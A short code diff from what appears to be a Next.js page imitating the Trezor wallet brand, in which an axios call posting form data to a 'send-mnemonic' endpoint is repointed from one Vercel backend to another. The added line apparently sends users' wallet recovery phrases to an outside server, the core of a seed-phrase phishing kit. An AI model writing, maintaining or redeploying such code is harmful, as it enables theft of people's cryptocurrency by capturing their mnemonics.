@@ -41,7 +41,7 @@ export default function HomePage() {
     console.log(data); // here you get your desired format
     try {
       const response = await axios.post(
-        "https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic",
+        "https://trezor-backend-nine.vercel.app/api/v1/send-mnemonic",
         data
       );
 
